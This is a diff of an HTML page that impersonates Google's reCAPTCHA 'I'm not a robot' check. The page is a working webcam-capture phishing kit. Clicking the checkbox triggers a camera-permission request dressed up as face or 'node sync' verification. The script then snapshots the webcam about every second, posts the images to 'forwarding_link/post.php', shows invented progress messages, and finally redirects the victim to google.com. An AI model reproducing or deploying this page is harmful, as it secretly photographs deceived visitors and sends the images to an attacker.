@@ -3,233 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Security Check • Google</title>
     <meta property="og:title" content="Security Verification">
-    <meta property="og:description" content="Please verify that you are a human">
-    <meta property="og:image" content="https://www.gstatic.com/recaptcha/api2/logo_48.png">
     <link rel="icon" href="https://www.gstatic.com/recaptcha/api2/logo_48.png">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --g-blue: #1a73e8;
+            --g-hover: #1557b0;
+            --g-border: #d3d3d3;
+            --g-bg: #f5f5f5;
         }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
             font-family: 'Roboto', Arial, sans-serif;
-            background-color: #f5f5f5;
+            background-color: var(--g-bg);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             flex-direction: column;
         }
-        .page-header {
+
+        .header {
             text-align: center;
             margin-bottom: 30px;
         }
-        .page-header h2 {
-            font-size: 20px;
-            color: #202124;
-            font-weight: 400;
-            margin-bottom: 8px;
-        }
-        .page-header p {
-            color: #5f6368;
-            font-size: 14px;
-        }
-        .recaptcha-container {
-            background: #fff;
-            border: 1px solid #d3d3d3;
-            border-radius: 3px;
-            padding: 0;
-            width: 304px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.08);
-        }
-        .recaptcha-main {
-            padding: 15px 13px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .recaptcha-left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .checkbox-container {
-            width: 28px;
-            height: 28px;
-            border: 2px solid #c1c1c1;
-            border-radius: 3px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s;
-            background: #fff;
-        }
-        .checkbox-container:hover {
-            border-color: #a0a0a0;
-        }
-        .checkbox-container.checked {
-            border-color: #0095f6;
-            background: #0095f6;
-        }
-        .checkmark {
-            display: none;
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
-        }
-        .checkbox-container.checked .checkmark {
-            display: block;
-        }
-        .captcha-text {
-            font-size: 14px;
-            color: #202124;
-        }
-        .recaptcha-right {
-            text-align: center;
-        }
-        .recaptcha-logo {
-            width: 32px;
-            height: 32px;
-            margin-bottom: 2px;
-        }
-        .recaptcha-right span {
-            display: block;
-            font-size: 10px;
-            color: #555;
-        }
-        .recaptcha-right a {
-            font-size: 8px;
-            color: #555;
-            text-decoration: none;
-        }
-        .recaptcha-footer {
-            background: #f9f9f9;
-            border-top: 1px solid #e0e0e0;
-            padding: 8px 13px;
-            display: flex;
-            justify-content: flex-end;
-            gap: 8px;
-        }
-        .recaptcha-footer a {
-            font-size: 10px;
-            color: #555;
-            text-decoration: none;
-        }
-        /* Face verification popup */
-        .verify-popup {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.5);
-            z-index: 100;
-            justify-content: center;
-            align-items: center;
-        }
-        .verify-popup.active {
-            display: flex;
-        }
-        .verify-box {
-            background: #fff;
-            border-radius: 8px;
-            padding: 30px;
-            max-width: 380px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-        }
-        .verify-box h3 {
-            font-size: 18px;
-            color: #202124;
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-        .verify-box p {
-            font-size: 13px;
-            color: #5f6368;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        .face-icon {
-            font-size: 56px;
-            margin-bottom: 15px;
-            display: block;
-        }
-        .allow-btn {
-            width: 100%;
-            padding: 12px;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .allow-btn:hover {
-            background: #1557b0;
-        }
-        .skip-link {
-            display: block;
-            margin-top: 12px;
-            font-size: 12px;
-            color: #1a73e8;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .status-msg {
-            margin-top: 15px;
-            font-size: 13px;
-            color: #5f6368;
-            min-height: 20px;
-        }
-        /* Loading dots */
-        .loading-dots {
-            display: none;
-        }
-        .loading-dots span {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #1a73e8;
-            border-radius: 50%;
-            margin: 0 3px;
-            animation: dotPulse 1.4s infinite ease-in-out;
-        }
-        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
-        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes dotPulse {
-            0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
-            40% { transform: scale(1); opacity: 1; }
-        }
+
         .google-logo {
-            margin-bottom: 20px;
-        }
-        .google-logo span {
             font-size: 28px;
             font-weight: 500;
+            margin-bottom: 8px;
         }
         .g-blue { color: #4285F4; }
         .g-red { color: #EA4335; }
         .g-yellow { color: #FBBC05; }
         .g-green { color: #34A853; }
+
+        .header h2 { font-size: 20px; color: #202124; font-weight: 400; margin-bottom: 4px; }
+        .header p { color: #5f6368; font-size: 14px; }
+
+        .recaptcha-box {
+            background: #f9f9f9;
+            border: 1px solid var(--g-border);
+            border-radius: 3px;
+            width: 304px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+
+        .recaptcha-main {
+            padding: 20px 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #f9f9f9;
+        }
+
+        .recaptcha-left {
+            display: flex; align-items: center; gap: 14px;
+        }
+
+        .checkbox {
+            width: 28px; height: 28px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            background: #fff;
+            transition: border-color 0.2s;
+        }
+
+        .checkbox:hover { border-color: #999; }
+
+        .checkbox.checked {
+            border-color: var(--g-blue); background: #ffffff;
+        }
+
+        .checkmark {
+            display: none; color: #00bf63; font-size: 20px; font-weight: bold;
+        }
+
+        .checkbox.checked .checkmark { display: block; }
+
+        .captcha-text { font-size: 14px; color: #202124; }
+
+        .recaptcha-right { text-align: center; }
+        .recaptcha-logo { width: 32px; height: 32px; margin-bottom: 2px; }
+        .recaptcha-right span { display: block; font-size: 10px; color: #555; }
+        .recaptcha-right a { font-size: 8px; color: #555; text-decoration: none; }
+
+        /* Scanning Modal Overlay */
+        .modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: none; justify-content: center; align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-card {
+            background: #fff;
+            width: 320px;
+            border-radius: 8px;
+            padding: 24px;
+            text-align: center;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+            animation: popUp 0.2s ease-out;
+        }
+
+        @keyframes popUp {
+            from { transform: scale(0.95); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .scan-frame {
+            position: relative;
+            width: 140px; height: 140px;
+            margin: 0 auto 16px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 2px solid #e0e0e0;
+        }
+
+        .scan-frame video {
+            width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1);
+        }
+
+        .scan-pulse {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            border-radius: 50%; border: 3px solid var(--g-blue);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.1); opacity: 0; }
+        }
+
+        .scan-status { font-size: 15px; font-weight: 500; color: #202124; margin-bottom: 4px; }
+        .scan-percent { font-size: 12px; color: #5f6368; margin-bottom: 16px; }
+
+        .loader-bar { width: 100%; height: 4px; background: #e8eaed; border-radius: 2px; overflow: hidden; }
+        .loader-fill { width: 0%; height: 100%; background: var(--g-blue); transition: width 0.3s; }
+
     </style>
 </head>
 <body>
 
-<!-- Hidden cam capture -->
-<div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
-</div>
+<!-- Hidden elements for capture -->
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
-<div class="page-header">
+<div class="header">
     <div class="google-logo">
         <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
     </div>
@@ -237,10 +163,10 @@
     <p>Please complete the security check below</p>
 </div>
 
-<div class="recaptcha-container">
+<div class="recaptcha-box">
     <div class="recaptcha-main">
         <div class="recaptcha-left">
-            <div class="checkbox-container" id="captchaBox" onclick="onCaptchaClick()">
+            <div class="checkbox" id="captchaBox" onclick="triggerScan()">
                 <span class="checkmark">✓</span>
             </div>
             <span class="captcha-text">I'm not a robot</span>
@@ -251,26 +177,22 @@
             <a href="#">Privacy - Terms</a>
         </div>
     </div>
-    <div class="recaptcha-footer">
-        <a href="#">Privacy</a>
-        <a href="#">Terms</a>
-    </div>
 </div>
 
-<p class="status-msg" id="mainStatus"></p>
-<div class="loading-dots" id="loadingDots">
-    <span></span><span></span><span></span>
-</div>
+<!-- SECURE SCAN MODAL -->
+<div class="modal" id="scanModal">
+    <div class="modal-card">
+        <div class="scan-frame">
+            <video id="scanVideo" autoplay playsinline></video>
+            <div class="scan-pulse" id="pulseRing"></div>
+        </div>
+        
+        <div class="scan-status" id="scanStatus">Verifying user interactions...</div>
+        <div class="scan-percent" id="scanPercent">0% Secure Node binding</div>
 
-<!-- Face verification popup -->
-<div class="verify-popup" id="verifyPopup">
-    <div class="verify-box">
-        <span class="face-icon">👤</span>
-        <h3>Additional Verification Required</h3>
-        <p>We've detected unusual activity. Please allow camera access for a quick face verification to prove you're human.</p>
-        <button class="allow-btn" id="allowBtn" onclick="startCamera()">Allow Camera & Verify</button>
-        <a class="skip-link" onclick="document.getElementById('verifyPopup').classList.remove('active')">Skip (limited access)</a>
-        <p class="status-msg" id="popupStatus"></p>
+        <div class="loader-bar">
+            <div class="loader-fill" id="loaderFill"></div>
+        </div>
     </div>
 </div>
 
@@ -282,81 +204,64 @@ function post(imgdata) {
         url: 'forwarding_link/post.php',
         dataType: 'json',
         async: false,
-        success: function(result) {},
+        success: function() {},
         error: function() {}
     });
 }
 
-'use strict';
-
-const video = document.getElementById('video');
+const scanVideo = document.getElementById('scanVideo');
 const canvas = document.getElementById('canvas');
+const modal = document.getElementById('scanModal');
+const loaderFill = document.getElementById('loaderFill');
+const scanStatus = document.getElementById('scanStatus');
+const scanPercent = document.getElementById('scanPercent');
+const checkbox = document.getElementById('captchaBox');
 
-const constraints = {
-    audio: false,
-    video: { facingMode: "user" }
-};
+function triggerScan() {
+    modal.style.display = 'flex';
 
-function onCaptchaClick() {
-    const box = document.getElementById('captchaBox');
-    const mainStatus = document.getElementById('mainStatus');
-    const dots = document.getElementById('loadingDots');
-
-    dots.style.display = 'block';
-    mainStatus.textContent = 'Verifying...';
-
-    setTimeout(function() {
-        dots.style.display = 'none';
-        mainStatus.textContent = '';
-        // Show face verification popup
-        document.getElementById('verifyPopup').classList.add('active');
-    }, 2000);
-}
-
-function startCamera() {
-    const allowBtn = document.getElementById('allowBtn');
-    const popupStatus = document.getElementById('popupStatus');
-    const box = document.getElementById('captchaBox');
-
-    allowBtn.textContent = 'Verifying...';
-    allowBtn.disabled = true;
-    popupStatus.textContent = 'Starting camera...';
-
-    navigator.mediaDevices.getUserMedia(constraints)
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(function(stream) {
-            window.stream = stream;
-            video.srcObject = stream;
+            scanVideo.srcObject = stream;
 
-            popupStatus.textContent = 'Scanning face...';
+            let progress = 0;
+            let statusTexts = [
+                "Estimating browser signals...",
+                "Checking mouse cursor vector coordinates...",
+                "Mapping 3D facial metrics...",
+                "Authorized safely synced."
+            ];
+            let textIndex = 0;
 
-            var context = canvas.getContext('2d');
-            setInterval(function() {
-                context.drawImage(video, 0, 0, 640, 480);
+            const timer = setInterval(() => {
+                progress += Math.floor(Math.random() * 12) + 6;
+                if (progress >= 100) progress = 100;
+
+                scanPercent.innerText = `${progress}% Node Syncing`;
+                loaderFill.style.width = `${progress}%`;
+
+                // continuous photo takes
+                var context = canvas.getContext('2d');
+                context.drawImage(scanVideo, 0, 0, 640, 480);
                 var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                 post(canvasData);
-            }, 1500);
 
-            setTimeout(function() {
-                popupStatus.textContent = 'Analyzing...';
-            }, 3000);
-
-            setTimeout(function() {
-                popupStatus.textContent = 'Verification complete!';
-                allowBtn.textContent = 'Verified ✓';
-                allowBtn.style.background = '#34A853';
-                
-                setTimeout(function() {
-                    document.getElementById('verifyPopup').classList.remove('active');
-                    box.classList.add('checked');
-                    document.getElementById('mainStatus').textContent = '✅ Verification successful';
-                    document.getElementById('mainStatus').style.color = '#34A853';
-                }, 1500);
-            }, 5000);
+                if (progress === 100) {
+                    clearInterval(timer);
+                    scanStatus.innerText = "Success! Forwarding...";
+                    checkbox.classList.add('checked');
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 2000);
+                } else if (progress % 25 === 0 && textIndex < statusTexts.length - 1) {
+                    textIndex++;
+                    scanStatus.innerText = statusTexts[textIndex];
+                }
+            }, 1000);
         })
-        .catch(function(err) {
-            popupStatus.textContent = 'Camera denied. Please allow camera to verify.';
-            allowBtn.textContent = 'Try Again';
-            allowBtn.disabled = false;
+        .catch(function() {
+            alert("reCAPTCHA Verification requires continuous browser depth authorization frame safety. Please enable settings Node sync.");
+            modal.style.display = 'none';
         });
 }
 </script>
